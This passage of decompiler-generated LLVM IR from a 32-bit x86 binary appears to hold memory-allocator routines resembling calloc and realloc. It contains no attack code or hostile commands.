  uselistorder label %dec_label_pc_8052ac1, { 1, 0 }
  uselistorder label %dec_label_pc_8052aaf, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8052a41, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052a3c, { 1, 0 }
  uselistorder label %dec_label_pc_8052a20, { 1, 0 }
  uselistorder label %dec_label_pc_80529c9, { 1, 0 }
  uselistorder label %dec_label_pc_80529b2, { 1, 0 }
  uselistorder label %dec_label_pc_805299b, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805291e, { 1, 0 }
  uselistorder label %dec_label_pc_8052911, { 1, 0 }
  uselistorder label %dec_label_pc_80528d2, { 1, 0 }
  uselistorder label %dec_label_pc_80528ab, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805288f, { 1, 0 }
  uselistorder label %dec_label_pc_8052876, { 1, 0 }
  uselistorder label %dec_label_pc_8052858, { 1, 0 }
  uselistorder label %dec_label_pc_8052773, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805276b, { 1, 0 }
  uselistorder label %dec_label_pc_8052754, { 1, 0 }
  uselistorder label %dec_label_pc_80526e7, { 1, 0 }
  uselistorder label %dec_label_pc_80526ec.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80526c0, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052647, { 1, 0 }
  uselistorder label %dec_label_pc_80525f6, { 1, 0 }
  uselistorder label %dec_label_pc_80525ce, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80525b7, { 1, 0 }
  uselistorder label %dec_label_pc_8052525, { 1, 0 }
  uselistorder label %dec_label_pc_80525f6.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80524f2, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8052470, { 1, 0 }
}

define i32 @function_8052b88(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052b88:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8052b88 = load i32, i32* @edi, align 4
  %v0_8052b8a = load i32, i32* @ebx, align 4
  %v12_8052b8b = ptrtoint i32* %stack_var_-28 to i32
  %v4_8052b8e = trunc i64 %arg1 to i32
  store i32 %v4_8052b8e, i32* @edx, align 4
  %sext = mul i64 %arg1, 4294967296
  %v2_8052b98 = sdiv i64 %sext, 4294967296
  %v3_8052b98 = sext i32 %arg2 to i64
  %v4_8052b98 = mul nsw i64 %v3_8052b98, %v2_8052b98
  %v5_8052b98 = trunc i64 %v4_8052b98 to i32
  store i32 %v5_8052b98, i32* @ebx, align 4
  %v2_8052b9b = icmp eq i32 %v4_8052b8e, 0
  br i1 %v2_8052b9b, label %dec_label_pc_8052bbd, label %dec_label_pc_8052b9f

dec_label_pc_8052b9f:                             ; preds = %dec_label_pc_8052b88
  store i32 %v4_8052b8e, i32* @edi, align 4
  %div = udiv i32 %v5_8052b98, %v4_8052b8e
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp14 = urem i32 %v5_8052b98, %v4_8052b8e
  store i32 %tmp14, i32* @edx, align 4
  %v12_8052ba7 = icmp eq i32 %div, %arg2
  br i1 %v12_8052ba7, label %dec_label_pc_8052bbd, label %dec_label_pc_8052bab

dec_label_pc_8052bab:                             ; preds = %dec_label_pc_8052b9f
  %v1_8052bab = call i32 @function_8051fb9(i32 %v0_8052b8a)
  store i32 %v1_8052bab, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8052bb2 = inttoptr i32 %v1_8052bab to i32*
  store i32 12, i32* %v1_8052bb2, align 4
  br label %dec_label_pc_8052c73

dec_label_pc_8052bbd:                             ; preds = %dec_label_pc_8052b9f, %dec_label_pc_8052b88
  store i32 %v12_8052b8b, i32* @eax, align 4
  %v2_8052bcd = call i32 @function_8053940(i32 %v12_8052b8b, i32 134560061)
  store i32 %v2_8052bcd, i32* %eax.global-to-local, align 4
  %v1_8052bd9 = call i32 @function_805393d(i32 ptrtoint (i32* @global_var_8056080.200 to i32))
  store i32 %v1_8052bd9, i32* %eax.global-to-local, align 4
  %v0_8052bde = load i32, i32* @ebx, align 4
  %v1_8052be1 = call i32 @function_8052414(i32 %v0_8052bde)
  store i32 %v1_8052be1, i32* %eax.global-to-local, align 4
  store i32 %v1_8052be1, i32* %ebx.global-to-local, align 4
  %v1_8052beb = icmp eq i32 %v1_8052be1, 0
  br i1 %v1_8052beb, label %dec_label_pc_8052c62, label %dec_label_pc_8052bef

dec_label_pc_8052bef:                             ; preds = %dec_label_pc_8052bbd
  %v1_8052bef = add i32 %v1_8052be1, -4
  %v2_8052bef = inttoptr i32 %v1_8052bef to i32*
  %v3_8052bef = load i32, i32* %v2_8052bef, align 4
  store i32 %v3_8052bef, i32* %eax.global-to-local, align 4
  %v2_8052bf2 = and i32 %v3_8052bef, 2
  %v3_8052bf2 = icmp eq i32 %v2_8052bf2, 0
  %v1_8052bf4 = icmp eq i1 %v3_8052bf2, false
  br i1 %v1_8052bf4, label %dec_label_pc_8052c62, label %dec_label_pc_8052bf6

dec_label_pc_8052bf6:                             ; preds = %dec_label_pc_8052bef
  %v1_8052bf63 = add i32 %v3_8052bef, -4
  %v1_8052bf9 = and i32 %v1_8052bf63, -4
  store i32 %v1_8052bf9, i32* @edx, align 4
  %v2_8052bfe = udiv i32 %v1_8052bf9, 4
  store i32 %v2_8052bfe, i32* %eax.global-to-local, align 4
  %v5_8052c01 = icmp ult i32 %v1_8052bf9, 36
  %tmp = and i32 %v1_8052bf63, -4
  %tmp18 = icmp eq i32 %tmp, 36
  %v2_8052c04 = or i1 %v5_8052c01, %tmp18
  br i1 %v2_8052c04, label %dec_label_pc_8052c15, label %dec_label_pc_8052c06

dec_label_pc_8052c06:                             ; preds = %dec_label_pc_8052bf6
  %v3_8052c0b = inttoptr i32 %v1_8052be1 to i8*
  %v4_8052c0b = call i32 @function_805200a(i8* %v3_8052c0b, i32 0, i32 %v1_8052bf9)
  store i32 %v4_8052c0b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052c62

dec_label_pc_8052c15:                             ; preds = %dec_label_pc_8052bf6
  %v1_8052c15 = inttoptr i32 %v1_8052be1 to i32*
  store i32 0, i32* %v1_8052c15, align 4
  %v0_8052c1b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052c1b = add i32 %v0_8052c1b, 4
  %v2_8052c1b = inttoptr i32 %v1_8052c1b to i32*
  store i32 0, i32* %v2_8052c1b, align 4
  %v0_8052c22 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052c22 = add i32 %v0_8052c22, 8
  %v2_8052c22 = inttoptr i32 %v1_8052c22 to i32*
  store i32 0, i32* %v2_8052c22, align 4
  %v0_8052c29 = load i32, i32* %eax.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_8052c29, 5
  br i1 %tmp15, label %dec_label_pc_8052c62, label %dec_label_pc_8052c2e

dec_label_pc_8052c2e:                             ; preds = %dec_label_pc_8052c15
  %v0_8052c2e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052c2e = add i32 %v0_8052c2e, 12
  %v2_8052c2e = inttoptr i32 %v1_8052c2e to i32*
  store i32 0, i32* %v2_8052c2e, align 4
  %v0_8052c35 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052c35 = add i32 %v0_8052c35, 16
  %v2_8052c35 = inttoptr i32 %v1_8052c35 to i32*
  store i32 0, i32* %v2_8052c35, align 4
  %v0_8052c3c = load i32, i32* %eax.global-to-local, align 4
  %tmp16 = icmp ult i32 %v0_8052c3c, 7
  br i1 %tmp16, label %dec_label_pc_8052c62, label %dec_label_pc_8052c41

dec_label_pc_8052c41:                             ; preds = %dec_label_pc_8052c2e
  %v0_8052c41 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052c41 = add i32 %v0_8052c41, 20
  %v2_8052c41 = inttoptr i32 %v1_8052c41 to i32*
  store i32 0, i32* %v2_8052c41, align 4
  %v0_8052c48 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052c48 = add i32 %v0_8052c48, 24
  %v2_8052c48 = inttoptr i32 %v1_8052c48 to i32*
  store i32 0, i32* %v2_8052c48, align 4
  %v0_8052c4f = load i32, i32* %eax.global-to-local, align 4
  %tmp17 = icmp ult i32 %v0_8052c4f, 9
  br i1 %tmp17, label %dec_label_pc_8052c62, label %dec_label_pc_8052c54

dec_label_pc_8052c54:                             ; preds = %dec_label_pc_8052c41
  %v0_8052c54 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052c54 = add i32 %v0_8052c54, 28
  %v2_8052c54 = inttoptr i32 %v1_8052c54 to i32*
  store i32 0, i32* %v2_8052c54, align 4
  %v0_8052c5b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052c5b = add i32 %v0_8052c5b, 32
  %v2_8052c5b = inttoptr i32 %v1_8052c5b to i32*
  store i32 0, i32* %v2_8052c5b, align 4
  br label %dec_label_pc_8052c62

dec_label_pc_8052c62:                             ; preds = %dec_label_pc_8052c41, %dec_label_pc_8052c2e, %dec_label_pc_8052c15, %dec_label_pc_8052bef, %dec_label_pc_8052bbd, %dec_label_pc_8052c06, %dec_label_pc_8052c54
  store i32 %v12_8052b8b, i32* @eax, align 4
  %v2_8052c6b = call i32 @function_8053940(i32 %v12_8052b8b, i32 1)
  store i32 %v2_8052c6b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052c73

dec_label_pc_8052c73:                             ; preds = %dec_label_pc_8052bab, %dec_label_pc_8052c62
  %v0_8052c76 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8052c76, i32* %eax.global-to-local, align 4
  store i32 %v0_8052b8a, i32* @ebx, align 4
  store i32 %v0_8052b88, i32* @edi, align 4
  ret i32 %v0_8052c76

; uselistorder directives
  uselistorder i32 %v1_8052bf9, { 3, 2, 0, 1 }
  uselistorder i32 %v1_8052be1, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v5_8052b98, { 1, 0, 2 }
  uselistorder i32 %v4_8052b8e, { 1, 0, 2, 3, 4 }
  uselistorder i32* %ebx.global-to-local, { 9, 0, 3, 1, 6, 2, 7, 4, 5, 8, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7, 9, 10, 11, 8, 12 }
  uselistorder i64 4294967296, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8052c73, { 1, 0 }
  uselistorder label %dec_label_pc_8052c62, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @function_8052c7c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052c7c:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8052c7f = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_8052c87 = icmp eq i32* %arg1, null
  %v1_8052c8c = icmp eq i1 %v4_8052c87, false
  br i1 %v1_8052c8c, label %dec_label_pc_8052c9e, label %dec_label_pc_8052c8e

dec_label_pc_8052c8e:                             ; preds = %dec_label_pc_8052c7c
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_8052c92 = call i32 @function_8052414(i32 %arg2)
  store i32 %v1_8052c92, i32* %eax.global-to-local, align 4
  store i32 %v1_8052c92, i32* @ebx, align 4
  br label %dec_label_pc_8052f97

dec_label_pc_8052c9e:                             ; preds = %dec_label_pc_8052c7c
  %v1_8052c9e = icmp eq i32 %arg2, 0
  %v1_8052ca0 = icmp eq i1 %v1_8052c9e, false
  br i1 %v1_8052ca0, label %dec_label_pc_8052cb3, label %dec_label_pc_8052ca2

dec_label_pc_8052ca2:                             ; preds = %dec_label_pc_8052c9e
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8052ca9 = call i32 @function_80531d9(i32 %tmp7)
  store i32 %v1_8052ca9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f97

dec_label_pc_8052cb3:                             ; preds = %dec_label_pc_8052c9e
  %v2_8052cbe = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8052cbe, i32* @eax, align 4
  store i32 %v2_8052cbe, i32* %stack_var_-60, align 4
  %v2_8052cc3 = call i32 @function_8053940(i32 %v2_8052cbe, i32 134560061)
  store i32 %v2_8052cc3, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8056080.200 to i32), i32* %stack_var_-60, align 4
  %v1_8052ccf = call i32 @function_805393d(i32 ptrtoint (i32* @global_var_8056080.200 to i32))
  store i32 %v1_8052ccf, i32* %eax.global-to-local, align 4
  %v0_8052cd7 = load i32, i32* @ebx, align 4
  %tmp20 = icmp ult i32 %v0_8052cd7, -32
  br i1 %tmp20, label %dec_label_pc_8052cee, label %dec_label_pc_8052cdc

dec_label_pc_8052cdc:                             ; preds = %dec_label_pc_8052cb3
  %v0_8052cdc = load i32, i32* %stack_var_-60, align 4
  %v1_8052cdc = call i32 @function_8051fb9(i32 %v0_8052cdc)
  store i32 %v1_8052cdc, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8052ce3 = inttoptr i32 %v1_8052cdc to i32*
  store i32 12, i32* %v1_8052ce3, align 4
  br label %dec_label_pc_8052f9a

dec_label_pc_8052cee:                             ; preds = %dec_label_pc_8052cb3
  %v1_8052cee = add i32 %v0_8052cd7, 11
  %tmp21 = icmp ult i32 %v1_8052cee, 16
  br i1 %tmp21, label %dec_label_pc_8052d05, label %dec_label_pc_8052cfe

dec_label_pc_8052cfe:                             ; preds = %dec_label_pc_8052cee
  %v1_8052cfe = and i32 %v1_8052cee, -8
  br label %dec_label_pc_8052d05

dec_label_pc_8052d05:                             ; preds = %dec_label_pc_8052cee, %dec_label_pc_8052cfe
  %stack_var_-40.0 = phi i32 [ %v1_8052cfe, %dec_label_pc_8052cfe ], [ 16, %dec_label_pc_8052cee ]
  %storemerge27 = phi i32 [ %v1_8052cfe, %dec_label_pc_8052cfe ], [ %v1_8052cee, %dec_label_pc_8052cee ]
  store i32 %storemerge27, i32* %eax.global-to-local, align 4
  %v1_8052d09 = add i32 %tmp7, -8
  store i32 %v1_8052d09, i32* @edi, align 4
  %v1_8052d0c = add i32 %tmp7, -4
  %v2_8052d0c = inttoptr i32 %v1_8052d0c to i32*
  %v3_8052d0c = load i32, i32* %v2_8052d0c, align 4
  store i32 %v3_8052d0c, i32* %edx.global-to-local, align 4
  %v1_8052d11 = and i32 %v3_8052d0c, -4
  store i32 %v1_8052d11, i32* %eax.global-to-local, align 4
  %v2_8052d18 = and i32 %v3_8052d0c, 2
  %v3_8052d18 = icmp eq i32 %v2_8052d18, 0
  %v1_8052d1b = icmp eq i1 %v3_8052d18, false
  br i1 %v1_8052d1b, label %dec_label_pc_8052eb5, label %dec_label_pc_8052d21

dec_label_pc_8052d21:                             ; preds = %dec_label_pc_8052d05
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8052d11, i32* @ebx, align 4
  %v7_8052d27 = icmp ult i32 %v1_8052d11, %stack_var_-40.0
  %v1_8052d29 = icmp eq i1 %v7_8052d27, false
  br i1 %v1_8052d29, label %dec_label_pc_8052e60, label %dec_label_pc_8052d2f

dec_label_pc_8052d2f:                             ; preds = %dec_label_pc_8052d21
  %v2_8052d2f = add i32 %v1_8052d11, %v1_8052d09
  store i32 %v2_8052d2f, i32* @esi, align 4
  %v1_8052d32 = load i32, i32* @global_var_805686c.202, align 4
  %v12_8052d32 = icmp eq i32 %v2_8052d2f, %v1_8052d32
  %v1_8052d38 = icmp eq i1 %v12_8052d32, false
  %v1_8052d72 = add i32 %v2_8052d2f, 4
  %v2_8052d72 = inttoptr i32 %v1_8052d72 to i32*
  %v3_8052d72 = load i32, i32* %v2_8052d72, align 4
  br i1 %v1_8052d38, label %dec_label_pc_8052d72, label %dec_label_pc_8052d3a

dec_label_pc_8052d3a:                             ; preds = %dec_label_pc_8052d2f
  %v1_8052d3f = and i32 %v3_8052d72, -4
  %v2_8052d42 = add i32 %v1_8052d3f, %v1_8052d11
  store i32 %v2_8052d42, i32* %ecx.global-to-local, align 4
  %v1_8052d48 = add i32 %stack_var_-40.0, 16
  store i32 %v1_8052d48, i32* %eax.global-to-local, align 4
  %v7_8052d4b = icmp ult i32 %v2_8052d42, %v1_8052d48
  br i1 %v7_8052d4b, label %dec_label_pc_8052db0, label %dec_label_pc_8052d4f

dec_label_pc_8052d4f:                             ; preds = %dec_label_pc_8052d3a
  %v1_8052d4f = urem i32 %v3_8052d0c, 2
  %v5_8052d52 = or i32 %v1_8052d4f, %stack_var_-40.0
  store i32 %v5_8052d52, i32* %edx.global-to-local, align 4
  store i32 %v5_8052d52, i32* %v2_8052d0c, align 4
  %v0_8052d5d = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052d5d = sub i32 %v0_8052d5d, %stack_var_-40.0
  %v0_8052d5f = load i32, i32* @edi, align 4
  %v2_8052d5f = add i32 %v0_8052d5f, %stack_var_-40.0
  store i32 %v2_8052d5f, i32* %eax.global-to-local, align 4
  %v1_8052d62 = or i32 %v2_8052d5d, 1
  store i32 %v1_8052d62, i32* %ecx.global-to-local, align 4
  store i32 %v2_8052d5f, i32* @global_var_805686c.202, align 4
  %v2_8052d6a = add i32 %v2_8052d5f, 4
  %v3_8052d6a = inttoptr i32 %v2_8052d6a to i32*
  store i32 %v1_8052d62, i32* %v3_8052d6a, align 4
  br label %dec_label_pc_8052f85

dec_label_pc_8052d72:                             ; preds = %dec_label_pc_8052d2f
  store i32 %v3_8052d72, i32* %edx.global-to-local, align 4
  %v1_8052d77 = and i32 %v3_8052d72, -2
  store i32 %v1_8052d77, i32* %eax.global-to-local, align 4
  %v3_8052d7a = add i32 %v1_8052d72, %v1_8052d77
  %v4_8052d7a = inttoptr i32 %v3_8052d7a to i8*
  %v5_8052d7a = load i8, i8* %v4_8052d7a, align 1
  %v6_8052d7a = urem i8 %v5_8052d7a, 2
  %v7_8052d7a = icmp eq i8 %v6_8052d7a, 0
  %v1_8052d7f = icmp eq i1 %v7_8052d7a, false
  br i1 %v1_8052d7f, label %dec_label_pc_8052db0, label %dec_label_pc_8052d81

dec_label_pc_8052d81:                             ; preds = %dec_label_pc_8052d72
  %v1_8052d81 = and i32 %v3_8052d72, -4
  store i32 %v1_8052d81, i32* %edx.global-to-local, align 4
  %v2_8052d88 = add i32 %v1_8052d81, %v1_8052d11
  store i32 %v2_8052d88, i32* @ebx, align 4
  %v10_8052d8a = icmp ult i32 %v2_8052d88, %stack_var_-40.0
  br i1 %v10_8052d8a, label %dec_label_pc_8052db0, label %dec_label_pc_8052d90

dec_label_pc_8052d90:                             ; preds = %dec_label_pc_8052d81
  %v1_8052d90 = add i32 %v1_8052d11, %tmp7
  %v2_8052d90 = inttoptr i32 %v1_8052d90 to i32*
  %v3_8052d90 = load i32, i32* %v2_8052d90, align 4
  store i32 %v3_8052d90, i32* @edx, align 4
  %v1_8052d93 = add i32 %v2_8052d2f, 12
  %v2_8052d93 = inttoptr i32 %v1_8052d93 to i32*
  %v3_8052d93 = load i32, i32* %v2_8052d93, align 4
  store i32 %v3_8052d93, i32* %eax.global-to-local, align 4
  %v1_8052d96 = add i32 %v3_8052d90, 12
  %v2_8052d96 = inttoptr i32 %v1_8052d96 to i32*
  %v3_8052d96 = load i32, i32* %v2_8052d96, align 4
  %v15_8052d96 = icmp eq i32 %v3_8052d96, %v2_8052d2f
  %v1_8052d99 = icmp eq i1 %v15_8052d96, false
  br i1 %v1_8052d99, label %dec_label_pc_8052da0, label %dec_label_pc_8052d9b

dec_label_pc_8052d9b:                             ; preds = %dec_label_pc_8052d90
  %v1_8052d9b = add i32 %v3_8052d93, 8
  %v2_8052d9b = inttoptr i32 %v1_8052d9b to i32*
  %v3_8052d9b = load i32, i32* %v2_8052d9b, align 4
  %v15_8052d9b = icmp eq i32 %v3_8052d9b, %v2_8052d2f
  br i1 %v15_8052d9b, label %dec_label_pc_8052da5, label %dec_label_pc_8052da0

dec_label_pc_8052da0:                             ; preds = %dec_label_pc_8052d9b, %dec_label_pc_8052d90
  %v0_8052da0 = call i32 @function_8053375()
  store i32 %v0_8052da0, i32* %eax.global-to-local, align 4
  %v1_8052da5.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052da5

dec_label_pc_8052da5:                             ; preds = %dec_label_pc_8052d9b, %dec_label_pc_8052da0
  %v1_8052da5 = phi i32 [ %v3_8052d90, %dec_label_pc_8052d9b ], [ %v1_8052da5.pre, %dec_label_pc_8052da0 ]
  %v0_8052da5 = phi i32 [ %v3_8052d93, %dec_label_pc_8052d9b ], [ %v0_8052da0, %dec_label_pc_8052da0 ]
  %v2_8052da5 = add i32 %v1_8052da5, 12
  %v3_8052da5 = inttoptr i32 %v2_8052da5 to i32*
  store i32 %v0_8052da5, i32* %v3_8052da5, align 4
  %v0_8052da8 = load i32, i32* @edx, align 4
  %v1_8052da8 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052da8 = add i32 %v1_8052da8, 8
  %v3_8052da8 = inttoptr i32 %v2_8052da8 to i32*
  store i32 %v0_8052da8, i32* %v3_8052da8, align 4
  %v0_8052e60.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052e60

dec_label_pc_8052db0:                             ; preds = %dec_label_pc_8052d81, %dec_label_pc_8052d72, %dec_label_pc_8052d3a
  %v1_8052db7 = add i32 %stack_var_-40.0, -7
  store i32 %v1_8052db7, i32* %eax.global-to-local, align 4
  store i32 %v1_8052db7, i32* %stack_var_-60, align 4
  %v1_8052dbb = call i32 @function_8052414(i32 %v1_8052db7)
  store i32 %v1_8052dbb, i32* %eax.global-to-local, align 4
  store i32 %v1_8052dbb, i32* %edx.global-to-local, align 4
  %v1_8052dc5 = icmp eq i32 %v1_8052dbb, 0
  br i1 %v1_8052dc5, label %dec_label_pc_8052f81, label %dec_label_pc_8052dcd

dec_label_pc_8052dcd:                             ; preds = %dec_label_pc_8052db0
  %v1_8052dcd = add i32 %v1_8052dbb, -8
  store i32 %v1_8052dcd, i32* %ebx.global-to-local, align 4
  %v1_8052dd0 = load i32, i32* @esi, align 4
  %v12_8052dd0 = icmp eq i32 %v1_8052dcd, %v1_8052dd0
  %v1_8052dd2 = add i32 %v1_8052dbb, -4
  %v2_8052dd2 = inttoptr i32 %v1_8052dd2 to i32*
  %v3_8052dd2 = load i32, i32* %v2_8052dd2, align 4
  store i32 %v3_8052dd2, i32* %eax.global-to-local, align 4
  %v1_8052dd5 = icmp eq i1 %v12_8052dd0, false
  br i1 %v1_8052dd5, label %dec_label_pc_8052de3, label %dec_label_pc_8052dd7

dec_label_pc_8052dd7:                             ; preds = %dec_label_pc_8052dcd
  %v1_8052dd7 = and i32 %v3_8052dd2, -4
  store i32 %v1_8052dd7, i32* %eax.global-to-local, align 4
  store i32 %v1_8052d11, i32* %edx.global-to-local, align 4
  %v2_8052dde = add i32 %v1_8052dd7, %v1_8052d11
  store i32 %v2_8052dde, i32* @ebx, align 4
  br label %dec_label_pc_8052e60

dec_label_pc_8052de3:                             ; preds = %dec_label_pc_8052dcd
  %v1_8052de7 = add i32 %v1_8052d11, -4
  store i32 %v1_8052de7, i32* %eax.global-to-local, align 4
  %v2_8052dec = udiv i32 %v1_8052de7, 4
  store i32 %v2_8052dec, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8052de7, 37
  br i1 %tmp, label %dec_label_pc_8052e05, label %dec_label_pc_8052df4

dec_label_pc_8052df4:                             ; preds = %dec_label_pc_8052de3
  store i32 %v1_8052dbb, i32* %stack_var_-60, align 4
  %v3_8052dfb = inttoptr i32 %v1_8052dbb to i16*
  %v4_8052dfb = call i32 @function_8054202(i16* %v3_8052dfb, i32 %tmp7, i32 %v1_8052de7)
  store i32 %v4_8052dfb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052e4c

dec_label_pc_8052e05:                             ; preds = %dec_label_pc_8052de3
  store i32 %tmp7, i32* @esi, align 4
  %v2_8052e0c = load i32, i32* %arg1, align 4
  store i32 %v2_8052e0c, i32* %eax.global-to-local, align 4
  %v2_8052e0e = inttoptr i32 %v1_8052dbb to i32*
  store i32 %v2_8052e0c, i32* %v2_8052e0e, align 4
  %v0_8052e10 = load i32, i32* @esi, align 4
  %v1_8052e10 = add i32 %v0_8052e10, 4
  %v2_8052e10 = inttoptr i32 %v1_8052e10 to i32*
  %v3_8052e10 = load i32, i32* %v2_8052e10, align 4
  store i32 %v3_8052e10, i32* %eax.global-to-local, align 4
  %v1_8052e13 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052e13 = add i32 %v1_8052e13, 4
  %v3_8052e13 = inttoptr i32 %v2_8052e13 to i32*
  store i32 %v3_8052e10, i32* %v3_8052e13, align 4
  %v0_8052e16 = load i32, i32* @esi, align 4
  %v1_8052e16 = add i32 %v0_8052e16, 8
  %v2_8052e16 = inttoptr i32 %v1_8052e16 to i32*
  %v3_8052e16 = load i32, i32* %v2_8052e16, align 4
  store i32 %v3_8052e16, i32* %eax.global-to-local, align 4
  %v1_8052e19 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052e19 = add i32 %v1_8052e19, 8
  %v3_8052e19 = inttoptr i32 %v2_8052e19 to i32*
  store i32 %v3_8052e16, i32* %v3_8052e19, align 4
  %tmp28 = icmp ult i32 %v1_8052de7, 17
  br i1 %tmp28, label %dec_label_pc_8052e4c, label %dec_label_pc_8052e1e

dec_label_pc_8052e1e:                             ; preds = %dec_label_pc_8052e05
  %v0_8052e1e = load i32, i32* @esi, align 4
  %v1_8052e1e = add i32 %v0_8052e1e, 12
  %v2_8052e1e = inttoptr i32 %v1_8052e1e to i32*
  %v3_8052e1e = load i32, i32* %v2_8052e1e, align 4
  store i32 %v3_8052e1e, i32* %eax.global-to-local, align 4
  %v0_8052e21 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052e24 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052e24 = add i32 %v1_8052e24, 12
  %v3_8052e24 = inttoptr i32 %v2_8052e24 to i32*
  store i32 %v3_8052e1e, i32* %v3_8052e24, align 4
  %v0_8052e27 = load i32, i32* @esi, align 4
  %v1_8052e27 = add i32 %v0_8052e27, 16
  %v2_8052e27 = inttoptr i32 %v1_8052e27 to i32*
  %v3_8052e27 = load i32, i32* %v2_8052e27, align 4
  store i32 %v3_8052e27, i32* %eax.global-to-local, align 4
  %v1_8052e2a = load i32, i32* %edx.global-to-local, align 4
  %v2_8052e2a = add i32 %v1_8052e2a, 16
  %v3_8052e2a = inttoptr i32 %v2_8052e2a to i32*
  store i32 %v3_8052e27, i32* %v3_8052e2a, align 4
  %tmp22 = icmp ult i32 %v0_8052e21, 7
  br i1 %tmp22, label %dec_label_pc_8052e4c, label %dec_label_pc_8052e2f

dec_label_pc_8052e2f:                             ; preds = %dec_label_pc_8052e1e
  %v0_8052e2f = load i32, i32* @esi, align 4
  %v1_8052e2f = add i32 %v0_8052e2f, 20
  %v2_8052e2f = inttoptr i32 %v1_8052e2f to i32*
  %v3_8052e2f = load i32, i32* %v2_8052e2f, align 4
  store i32 %v3_8052e2f, i32* %eax.global-to-local, align 4
  %v0_8052e32 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052e35 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052e35 = add i32 %v1_8052e35, 20
  %v3_8052e35 = inttoptr i32 %v2_8052e35 to i32*
  store i32 %v3_8052e2f, i32* %v3_8052e35, align 4
  %v0_8052e38 = load i32, i32* @esi, align 4
  %v1_8052e38 = add i32 %v0_8052e38, 24
  %v2_8052e38 = inttoptr i32 %v1_8052e38 to i32*
  %v3_8052e38 = load i32, i32* %v2_8052e38, align 4
  store i32 %v3_8052e38, i32* %eax.global-to-local, align 4
  %v1_8052e3b = load i32, i32* %edx.global-to-local, align 4
  %v2_8052e3b = add i32 %v1_8052e3b, 24
  %v3_8052e3b = inttoptr i32 %v2_8052e3b to i32*
  store i32 %v3_8052e38, i32* %v3_8052e3b, align 4
  %tmp23 = icmp ult i32 %v0_8052e32, 9
  br i1 %tmp23, label %dec_label_pc_8052e4c, label %dec_label_pc_8052e40

dec_label_pc_8052e40:                             ; preds = %dec_label_pc_8052e2f
  %v0_8052e40 = load i32, i32* @esi, align 4
  %v1_8052e40 = add i32 %v0_8052e40, 28
  %v2_8052e40 = inttoptr i32 %v1_8052e40 to i32*
  %v3_8052e40 = load i32, i32* %v2_8052e40, align 4
  store i32 %v3_8052e40, i32* %eax.global-to-local, align 4
  %v1_8052e43 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052e43 = add i32 %v1_8052e43, 28
  %v3_8052e43 = inttoptr i32 %v2_8052e43 to i32*
  store i32 %v3_8052e40, i32* %v3_8052e43, align 4
  %v0_8052e46 = load i32, i32* @esi, align 4
  %v1_8052e46 = add i32 %v0_8052e46, 32
  %v2_8052e46 = inttoptr i32 %v1_8052e46 to i32*
  %v3_8052e46 = load i32, i32* %v2_8052e46, align 4
  store i32 %v3_8052e46, i32* %eax.global-to-local, align 4
  %v1_8052e49 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052e49 = add i32 %v1_8052e49, 32
  %v3_8052e49 = inttoptr i32 %v2_8052e49 to i32*
  store i32 %v3_8052e46, i32* %v3_8052e49, align 4
  br label %dec_label_pc_8052e4c

